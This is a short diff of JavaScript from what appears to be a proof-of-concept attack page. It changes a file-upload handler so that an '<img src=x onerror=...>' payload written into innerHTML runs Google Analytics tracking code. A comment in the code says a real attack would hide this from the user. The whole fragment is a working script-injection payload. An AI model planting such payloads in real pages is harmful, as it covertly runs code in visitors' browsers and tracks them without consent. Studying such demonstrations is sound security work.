@@ -22,7 +22,7 @@
 	
 		  var r = new FileReader();
         thing.onchange = function() {
-		var temp="<scr"+"ipt>window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'UA-170959658-1');<scr"+"ipt>";
+		var temp="<img src=x onerror=\"window.dataLayer = window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());  gtag('config', 'UA-170959658-1');\">";
 		qmsg.innerHTML = temp;
             alert('UwU What is this?...');//This is for PoC only. A real attack would not let the user know what happened.
 			r.onload=function(){
